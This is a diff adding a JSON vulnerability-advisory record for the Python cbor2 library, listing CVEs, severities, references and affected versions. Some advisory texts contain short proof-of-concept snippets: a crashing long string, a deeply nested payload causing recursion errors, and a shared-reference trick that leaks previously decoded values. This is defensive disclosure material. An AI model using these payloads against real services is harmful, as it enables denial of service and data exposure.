@@ -1,0 +1,430 @@
+{
+  "schema_version": 1,
+  "package": "cbor2",
+  "purls": [
+    "pkg:pypi/cbor2"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 14,
+  "advisories": [
+    {
+      "id": "GHSA-375g-39jq-vq7m",
+      "primary_id": "CVE-2024-26134",
+      "aliases": [
+        "CVE-2024-26134",
+        "PYSEC-2024-155"
+      ],
+      "cve_ids": [
+        "CVE-2024-26134"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "cbor2",
+      "summary": "Potential buffer overflow in CBOR2 decoder",
+      "details": "### Summary\nEver since https://github.com/agronholm/cbor2/pull/204 (or specifically https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542) was merged, I can create a reproducible crash when running the snippet under PoC on a current Debian bullseye aarm64 on a Raspberry Pi 3 (I was **not** able to reproduce this on my x86_64 Laptop with Python 3.11; I suspect because there is enough memory to allocate still)\n\n## Details\n\n\n### PoC\n```py\nimport json\nimport concurrent.futures\nimport cbor2\n\ndef test():\n    obj = \"x\" * 131128\n    cbor_enc = cbor2.dumps(obj)\n    return cbor2.loads(cbor_enc)\n\nwith concurrent.futures.ProcessPoolExecutor() as executor:\n    future = executor.submit(test)\n    print(future.result())\n```\n\n```\nmalloc(): unsorted double linked list corrupted\nTraceback (most recent call last):\n  File \"test.py\", line 14, in <module>\n    print(future.result())\n  File \"/usr/lib/python3.9/concurrent/futures/_base.py\", line 440, in result\n    return self.__get_result()\n  File \"/usr/lib/python3.9/concurrent/futures/_base.py\", line 389, in __get_result\n    raise self._exception\nconcurrent.futures.process.BrokenProcessPool: A process in the process pool was terminated abruptly while the future was running or pending.\n```\n\nIf one calls it without the indirection via the pool executor, a SystemError is shown that hides the buffer overflow.\n\n```py\nimport json\nimport cbor2\n\ndef test():\n    obj = \"x\" * 131128\n    cbor_enc = cbor2.dumps(obj)\n    return cbor2.loads(cbor_enc)\n\nprint(test())\n```\n\n```\nTraceback (most recent call last):\n  File \"test.py\", line 12, in <module>\n    print(test())\n  File \"test.py\", line 9, in test\n    return cbor2.loads(cbor_enc)\nSystemError: <built-in function loads> returned NULL without setting an error\n```\n\n### Impact\nAn attacker can crash a service using cbor2 to parse a CBOR binary by sending a long enough object.",
+      "published": "2024-02-21T00:09:03Z",
+      "modified": "2026-02-04T03:05:13.582793Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/security/advisories/GHSA-375g-39jq-vq7m"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-26134"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/pull/204"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/commit/4de6991ba29bf2290d7b9d83525eda7d021873df"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/agronholm/cbor2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/releases/tag/5.6.2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/cbor2/PYSEC-2024-155.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BT42VXZMMMCSSHMA65KKPOZCXJEYHNR5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GX524ZG2XJWFV37UQKQ4LWIH4UICSGEQ"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PWC3VU6YV6EXKCSX5GTKWLBZIDIJNQJY"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-375g-39jq-vq7m",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "5.5.1"
+            },
+            {
+              "fixed": "5.6.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "5.5.1",
+        "5.6.0",
+        "5.6.1"
+      ],
+      "affected_conda_versions": [
+        "5.5.1",
+        "5.6.0",
+        "5.6.1"
+      ]
+    },
+    {
+      "id": "GHSA-3c37-wwvx-h642",
+      "primary_id": "CVE-2026-26209",
+      "aliases": [
+        "CVE-2026-26209"
+      ],
+      "cve_ids": [
+        "CVE-2026-26209"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "cbor2",
+      "summary": "cbor2 has a Denial of Service via Uncontrolled Recursion in cbor2.loads",
+      "details": "### Summary\n\n- The `cbor2` library is vulnerable to a Denial of Service (DoS) attack caused by uncontrolled recursion when decoding deeply nested CBOR structures.\n- This vulnerability affects both the pure Python implementation and the C extension (`_cbor2`). The C extension correctly uses Python's C-API for recursion protection (`Py_EnterRecursiveCall`), but this mechanism is designed to prevent a stack overflow by raising a `RecursionError`. In some environments, this exception is not caught, thus causing the service process to terminate.\n- While the library handles moderate nesting, it lacks a configurable, data-driven depth limit independent of Python's global recursion setting. An attacker can supply a crafted CBOR payload containing thousands of nested arrays (e.g., `0x81`). When `cbor2.loads()` attempts to parse this, it hits the interpreter's recursion limit, causing the call to raise a `RecursionError`.\n- By sending a stream of small (<100KB) malicious packets, an attacker can repeatedly crash worker processes faster than they can be restarted, resulting in a complete and sustained Denial of Service.\n\n### Details\n\n- The vulnerability stems from the recursive design of the `CBORDecoder` class, specifically how it decodes nested container types like Arrays and Maps.\n- Inside `decode_array` (and similarly `decode_map`), the decoder iterates through the number of elements specified in the CBOR header. For each element, it calls `self.decode()` again to parse the nested item. This recursive call lacks a depth-tracking mechanism.\n- Vulnerable Code Locations:\n  - `cbor2/decoder.py` (Pure Python implementation)\n  - `source/decoder.c` (C extension implementation)\n- Execution Flow:\n  1. The `cbor2.loads()` function initializes a `CBORDecoder` and calls its `decode()` method.\n  2. The `decode()` method reads the initial byte and dispatches control to a specific handler based on the major type. For an Array (Major Type 4), it calls `decode_array`.\n  3. `decode_array` loops and calls `self.decode()` for each item, leading to deep recursion when parsing a payload like `[...[...[1]...]...]`.\n\n### PoC\n\n```\nimport cbor2\n\nDEPTH = 1000\n\npayload = b'\\x81' * DEPTH + b'\\x01'\nprint(f\"[*] Payload size: {len(payload) / 1024:.2f} KB\")\nprint(\"[*] Triggering decoder...\")\n\ntry:\n    cbor2.loads(payload)\n    print(\"[+] Parsed successfully (Not Vulnerable)\")\nexcept RecursionError:\n    print(\"\\n[!] VULNERABLE: RecursionError triggered!\")\nexcept Exception as e:\n    print(f\"\\n[-] Unexpected Error: {type(e).__name__}: {e}\")\n```\n\n### Impact\n\n- Scope: This vulnerability affects any application using `cbor2` to parse untrusted data. Common use cases include IoT data processing, WebAuthn (FIDO2) authentication flows, and inter-service communication over COSE (CBOR Object Signing and Encryption).\n- Attack Vector: A remote, unauthenticated attacker can achieve a full Denial of Service with a highly efficient, low-bandwidth attack. A payload under 100KB is sufficient to reliably terminate a Python worker process.\n\n### Credit\n\nThis issue was discovered by Kevin Tu of TMIR at ByteDance. The patch was developed by @agronholm.",
+      "published": "2026-03-23T20:23:57Z",
+      "modified": "2026-03-27T00:59:20.137193Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/security/advisories/GHSA-3c37-wwvx-h642"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-26209"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/pull/275"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/commit/e61a5f365ba610d5907a0ae1bc72769bba34294b"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/agronholm/cbor2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/releases/tag/5.9.0"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-3c37-wwvx-h642",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "5.9.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.0.0",
+        "1.1.0",
+        "2.0.0",
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "4.0.0",
+        "4.0.1",
+        "4.1.0",
+        "4.1.1",
+        "4.1.2",
+        "5.0.0",
+        "5.0.1",
+        "5.1.0",
+        "5.1.1",
+        "5.1.2",
+        "5.2.0",
+        "5.2.0.post1",
+        "5.3.0",
+        "5.4.0",
+        "5.4.1",
+        "5.4.2",
+        "5.4.2.post1",
+        "5.4.3",
+        "5.4.4",
+        "5.4.5",
+        "5.4.6",
+        "5.5.0",
+        "5.5.1",
+        "5.6.0",
+        "5.6.1",
+        "5.6.2",
+        "5.6.3",
+        "5.6.4",
+        "5.6.5",
+        "5.7.0",
+        "5.7.1",
+        "5.8.0"
+      ],
+      "affected_conda_versions": [
+        "5.1.0",
+        "5.4.6",
+        "5.5.0",
+        "5.5.1",
+        "5.6.0",
+        "5.6.1",
+        "5.6.2",
+        "5.6.3",
+        "5.6.4",
+        "5.6.5",
+        "5.7.0",
+        "5.7.1",
+        "5.8.0"
+      ]
+    },
+    {
+      "id": "GHSA-wcj4-jw5j-44wh",
+      "primary_id": "CVE-2025-68131",
+      "aliases": [
+        "CVE-2025-68131"
+      ],
+      "cve_ids": [
+        "CVE-2025-68131"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "cbor2",
+      "summary": "CBORDecoder reuse can leak shareable values across decode calls",
+      "details": "### Summary\nWhen a CBORDecoder instance is reused across multiple decode operations, values marked with the shareable tag (28) persist in memory and can be accessed by subsequent CBOR messages using the sharedref tag (29). This allows an attacker-controlled message to read data from previously decoded messages if the decoder is reused across trust boundaries.\n\n### Details\nThe issue is in the decoder's handling of the shareables list, which stores values tagged with CBOR tag 28 (shareable) for later reference by tag 29 (sharedref).\n\nWhen decode_from_bytes() is called or when .fp is set to a new stream, the shareables list is not cleared. This allows references to persist across separate decode operations.\n\nThe issue exists in both the C extension and the pure Python decoder.\n\nIn the C extension (source/decoder.c), the _CBORDecoder_set_fp function (line ~202) updates the file pointer but does not reset the shareables state:\n\n```\n  static int\n  _CBORDecoder_set_fp(CBORDecoderObject *self, PyObject *value, void *closure)\n  {\n      // ... validation ...\n      tmp = self->read;\n      self->read = read;\n      Py_DECREF(tmp);\n      return 0;\n      // Missing: PyList_Clear(self->shareables) or equivalent\n  }\n```\n\nIn the pure Python decoder (cbor2/_decoder.py), the fp setter similarly fails to clear self._shareables.\n\nSimilarly, decode_from_bytes() in both implementations saves and restores the read pointer but does not clear the shareables list between decodes.\n\nThe shareable/sharedref tags are defined in the CBOR value sharing extension (http://cbor.schmorp.de/value-sharing) with scope limited to a single CBOR data item, not across separate messages.\n\n### PoC\n\n```\nimport cbor2\nfrom io import BytesIO\n\n# Message from trusted source containing a shareable value\nmsg1 = cbor2.dumps(cbor2.CBORTag(28, \"secret\"))\n\n# Attacker-controlled message referencing index 0\nmsg2 = cbor2.dumps(cbor2.CBORTag(29, 0))\n\n# Decoder reused across trust boundaries\ndecoder = cbor2.CBORDecoder(BytesIO(b''))\ndecoder.decode_from_bytes(msg1)\nprint(decoder.decode_from_bytes(msg2))  # prints \"secret\"\n```\nNo special configuration required. Affects any application that reuses a CBORDecoder instance to decode messages from different sources.\n\n### Impact\nInformation disclosure. Applications that reuse a CBORDecoder across trust boundaries are vulnerable if the trusted messages use value sharing (tag 28) and an attacker can send messages containing shared references (tag 29). An attacker who can send a crafted CBOR message containing a sharedref tag can read values from previously decoded messages, potentially exposing sensitive data such as credentials, tokens, or private user data.\n\n### Related\nA similar issue in the encoder could produce invalid CBOR with dangling shared references:\n\n```\nimport cbor2\nfrom io import BytesIO\n\n# Create encoder with value sharing enabled\nencoder = cbor2.CBOREncoder(BytesIO(), value_sharing=True)\n\n# Persistent object that will be encoded multiple times\nshared_obj = ['hello']\n\n# First encode: array containing shared_obj twice\nencoder.encode([shared_obj, shared_obj])\nprint(f'First encode: {encoder.fp.getvalue().hex()}')\n# Output: d81c82d81c816568656c6c6fd81d01\n\n# Second encode: just shared_obj\nencoder.fp = BytesIO()\nencoder.encode(shared_obj)\nresult = encoder.fp.getvalue()\nprint(f'Second encode: {result.hex()}')\n# Output: d81d01  (just a shared reference to index 1!)\n\n# Try to decode the second result as standalone CBOR\ndecoder = cbor2.CBORDecoder(BytesIO(result))\ndecoded = decoder.decode()\n# FAILS: shared reference 1 not found\n```\n\nWhile primarily a correctness bug, it could cause denial of service if invalid CBOR is transmitted to downstream systems that fail to parse it, or cause silent data corruption if the dangling reference happens to resolve to an unrelated value.\n\nIt can also be considered a memory leak in both the decoder and encoder as references are held that will never be released as long as the decoder/encoder remains alive.\n\n### Suggested resolution\n\nAdd dedicated boolean flags to track when an encode/decode operation is in progress. Reset shared state only when the flag is False (top-level call). This ensures state is reset for standalone calls while preserving shared references for nested calls from hooks (which need access to the registry for cyclic structures).\n\nDecoder (_decoding flag):\n - decode(): set flag True, reset state, decode, set flag False\n - decode_from_bytes(): reset state only when flag is False\n\nEncoder (_encoding flag):\n - encode(): set flag True, reset state, encode, set flag False\n - encode_to_bytes(): reset state only when flag is False",
+      "published": "2025-12-31T22:01:38Z",
+      "modified": "2026-02-04T03:55:15.200818Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:L/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:L/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/security/advisories/GHSA-wcj4-jw5j-44wh"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-68131"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/commit/f1d701cd2c411ee40bb1fe383afe7f365f35abf0"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/agronholm/cbor2"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-wcj4-jw5j-44wh",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.0.0"
+            },
+            {
+              "fixed": "5.8.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "4.0.0",
+        "4.0.1",
+        "4.1.0",
+        "4.1.1",
+        "4.1.2",
+        "5.0.0",
+        "5.0.1",
+        "5.1.0",
+        "5.1.1",
+        "5.1.2",
+        "5.2.0",
+        "5.2.0.post1",
+        "5.3.0",
+        "5.4.0",
+        "5.4.1",
+        "5.4.2",
+        "5.4.2.post1",
+        "5.4.3",
+        "5.4.4",
+        "5.4.5",
+        "5.4.6",
+        "5.5.0",
+        "5.5.1",
+        "5.6.0",
+        "5.6.1",
+        "5.6.2",
+        "5.6.3",
+        "5.6.4",
+        "5.6.5",
+        "5.7.0",
+        "5.7.1"
+      ],
+      "affected_conda_versions": [
+        "5.1.0",
+        "5.4.6",
+        "5.5.0",
+        "5.5.1",
+        "5.6.0",
+        "5.6.1",
+        "5.6.2",
+        "5.6.3",
+        "5.6.4",
+        "5.6.5",
+        "5.7.0",
+        "5.7.1"
+      ]
+    },
+    {
+      "id": "PYSEC-2024-155",
+      "primary_id": "CVE-2024-26134",
+      "aliases": [
+        "CVE-2024-26134",
+        "GHSA-375g-39jq-vq7m"
+      ],
+      "cve_ids": [
+        "CVE-2024-26134"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "cbor2",
+      "summary": null,
+      "details": "cbor2 provides encoding and decoding for the Concise Binary Object Representation (CBOR) (RFC 8949) serialization format. Starting in version 5.5.1 and prior to version 5.6.2, an attacker can crash a service using cbor2 to parse a CBOR binary by sending a long enough object. Version 5.6.2 contains a patch for this issue.",
+      "published": "2024-02-19T23:15:07Z",
+      "modified": "2026-02-04T14:28:14.681606Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/agronholm/cbor2/security/advisories/GHSA-375g-39jq-vq7m"
+        },
+        {
+          "type": "ARTICLE",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BT42VXZMMMCSSHMA65KKPOZCXJEYHNR5/"
+        },
+        {
+          "type": "ARTICLE",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GX524ZG2XJWFV37UQKQ4LWIH4UICSGEQ/"
+        },
+        {
+          "type": "ARTICLE",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PWC3VU6YV6EXKCSX5GTKWLBZIDIJNQJY/"
+        },
+        {
+          "type": "EVIDENCE",
+          "url": "https://github.com/agronholm/cbor2/security/advisories/GHSA-375g-39jq-vq7m"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/agronholm/cbor2/commit/4de6991ba29bf2290d7b9d83525eda7d021873df"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://github.com/agronholm/cbor2/pull/204"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/agronholm/cbor2/releases/tag/5.6.2"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2024-155",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "5.5.1"
+            },
+            {
+              "fixed": "5.6.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "5.5.1",
+        "5.6.0",
+        "5.6.1"
+      ],
+      "affected_conda_versions": [
+        "5.5.1",
+        "5.6.0",
+        "5.6.1"
+      ]
+    }
+  ]
+}
